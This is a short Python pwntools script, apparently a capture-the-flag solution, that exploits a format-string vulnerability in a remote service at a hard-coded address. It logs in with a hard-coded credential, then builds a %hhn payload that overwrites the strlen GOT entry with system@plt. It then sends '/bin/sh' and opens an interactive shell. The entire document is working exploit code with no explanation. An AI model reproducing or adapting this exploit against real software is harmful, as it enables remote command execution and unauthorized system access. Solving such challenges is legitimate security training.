#!/usr/bin/env python
from pwn import *

#r = remote('127.0.0.1', 4000)
r = remote('146.185.132.36', 12431)

system_plt = 0x400700
strlen_got = 0x602028

def send_cmd(cmd):
    r.sendlineafter('1) admin action\n', '1')
    r.sendafter('Give me your command : ', cmd)

r.sendafter('Credential : ', '7h15_15_v3ry_53cr37_1_7h1nk')

# only overwrite lower 6-bytes
fmt = ''
printed = 255 - 96
for i in range(6):
    byte = (system_plt >> (8*i)) & 0xff
    padding = (byte - printed - 3 + 256) % 256
    if padding > 0:
        fmt += '%{}c'.format(str(padding).rjust(3, '0')) + '###'
    fmt += '%{}$hhn'.format(str(40+i).rjust(3, '0'))
    printed = (printed + padding + 3 ) % 256

log.info('strlen(fmt): ' + str(len(fmt)))

fmt += '\x00'
for i in range(6):
    fmt += p64(strlen_got + i)

send_cmd('A'*(255-96) + fmt)

send_cmd('/bin/sh\x00')

r.interactive()
